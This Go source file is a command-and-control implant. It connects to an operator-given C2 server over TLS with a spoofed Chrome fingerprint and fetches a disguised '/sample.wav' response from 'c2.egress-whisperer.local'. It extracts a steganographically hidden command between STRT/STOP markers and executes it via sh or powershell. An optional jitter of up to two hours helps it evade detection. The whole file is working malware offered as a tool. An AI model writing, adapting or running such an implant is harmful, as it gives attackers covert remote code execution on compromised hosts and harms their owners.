package main

import (
	"fmt"
	"net"
	"time"
	"io"
	"log"
	"sync"
	"strings"
	"flag"
	//"encoding/binary"
	"math/rand"
	"strconv"
	"os/exec"
	"runtime"
	utls "github.com/refraction-networking/utls"
)

// Create a global pool of byte slices to reuse memory across goroutines, in case the project goes to a 65k port option
var bufPool = sync.Pool{
	New: func() interface{} {
		return make([]byte, 1024)
	},
}

type dialResult struct {
	port   string
	status string
}

var c2_server_ip string
var c2_hostname ="c2.egress-whisperer.local"
var timeout time.Duration

var http_request_string = "GET /sample.wav HTTP/1.1\r\n" +
           "Host: " + c2_hostname + "\r\n" +
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n" +
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" +
           "Accept-Language: en-US,en;q=0.5\r\n" +
           "Connection: close\r\n" + 
           "\r\n"

func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- dialResult){
	
	defer wg.Done()

	var con_type string
	if port=="53"||port=="123"{ con_type="udp" } else {con_type ="tcp"}

	conn, err := net.DialTimeout(con_type, c2_server_ip+":"+port, timeout)
	if err!=nil{
		log.Println(err)
		//fmt.Println("port "+port+" coming mark 1")
		resultChan <- dialResult{port: port, status: err.Error()}
		return
	}
	defer conn.Close()

	//conn.SetDeadline(time.Now().Add(timeout))


	config := &utls.Config{InsecureSkipVerify: true}
	uConn := utls.UClient(conn, config, utls.HelloChrome_Auto)
	//uConn.SetDeadline(time.Now().Add(timeout))

	err = uConn.Handshake()
	if err != nil {
		log.Println("TLS Handshake Blocked or Failed:", err)
		resultChan <- dialResult{port: port, status: err.Error()}
		return
	}
	defer uConn.Close()

	fmt.Fprintf(uConn, http_request_string)
	
	// Borrow a buffer from the pool
	buf := bufPool.Get().([]byte)
	// Return to the pool when the function exits
	defer bufPool.Put(buf)

	n, err := uConn.Read(buf)
	if err!=nil && err!=io.EOF{
		log.Println(err)
		//fmt.Println("port "+port+" coming mark 6")
		resultChan <- dialResult{port: port, status: err.Error()}
		return
	}
	//fmt.Println("Recieved ", n, " bits with value", string(buf[:n]), "and bytes ", buf[:n])
	
	//************logic for decoding the incoming bytes******************//
	//-------decoding test

	cmd_bitIndex := 0
	store_command := 0
	var decoded_cmd_byte []byte
	var fifo4 []byte
	var current_decoded_byte byte

	for _, stegd_byte := range(buf[:n]){
		last_bit_str := fmt.Sprintf("%08b", stegd_byte)
		last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
		//fmt.Println(last_bit_int)
		current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)

		cmd_bitIndex++
		if cmd_bitIndex==8{
			if store_command==1{
				decoded_cmd_byte = append(decoded_cmd_byte, current_decoded_byte)
			}
			fifo4 = append(fifo4, current_decoded_byte)
			if len(fifo4) > 4{
				fifo4 = fifo4[1:]
			}
			if "STRT"==string(fifo4){
				store_command = 1
			}
			if "STOP"==string(fifo4){
				store_command = 0
			}
			cmd_bitIndex =0
			current_decoded_byte = 0
		}
	}
	finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
	fmt.Println("decoded_cmd_byte = ", finalCommand)

	shellBinary := "sh"
	shellFlag := "-c"
	
	if runtime.GOOS == "windows"{
		shellBinary = "powershell"
		shellFlag = "/C"
	}
	cmd := exec.Command(shellBinary, shellFlag, finalCommand)
	res, err := cmd.Output()
	if err != nil {
		log.Fatalf("Failed to execute command: %v", err)
	}

	formatted_out := strings.TrimSpace(string(res))
	fmt.Println("result = ", formatted_out) 

	//*****************************end************************************//


	resultChan <- dialResult{port: port, status: "success for "+port}

	
}

func main(){
	//user input collection
	target  := flag.String("target", "", "C2 server IP address (required)")
    timeout = *flag.Duration("timeout", 10*time.Second, "probe timeout per port")
    ports   := flag.String("ports", "80,8080,443,53,123", "comma separated ports to probex")
    stealth := flag.Int("stealth", 0, "Introduce random jitter between each probes. goes 0-4. Higher the number, slowe the probes")
    
    flag.Parse()

    if *target == "" {
        fmt.Println("Error: -target is required")
        flag.Usage()
        return
    }
    c2_server_ip = *target
    sl:=*stealth
    port_list := strings.Split(*ports, ",")
	for i, p := range port_list {
    	port_list[i] = strings.TrimSpace(p)
	}

	//port_list := []string{"80", "8080", "443", "53", "123", "9001", "8443"}
	//supported ports from the server-side

	port_list = []string{"443"}
	
	report := make(map[string]string)

	resultChan := make(chan dialResult, len(port_list))
	var wg sync.WaitGroup

	for _, port := range port_list{
		wg.Add(1)
		if sl >0{
			calculateAndJitter(sl)
		}
		go invokeParallelDialups(port, &wg, resultChan)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	for i := 0; i < len(port_list); i++ {
		res := <-resultChan
		report[res.port] = res.status // Only main routine writes to map (Safe!)
	}

}

func calculateAndJitter(sl int){

	var baseDelay time.Duration
	switch sl{
	case 1:
		baseDelay = 2 * time.Second
	case 2:
		baseDelay = 20 * time.Second
	case 3:
		baseDelay = 10 * time.Minute
	case 4:
		fallthrough //anything greater than 4 gets a base delay of 2 hours
	default:
		baseDelay = 2 * time.Hour
	}

	//use a variance of +/-20 %
	minMultiplier := 0.8
	maxMultiplier := 1.2

	//calculate a random multiplier within that range
	randomMultiplier := minMultiplier + rand.Float64()*(maxMultiplier-minMultiplier)
	actualSleep := time.Duration(float64(baseDelay) * randomMultiplier)
	fmt.Println("Sleeping for ", actualSleep)
	time.Sleep(actualSleep)
	return
}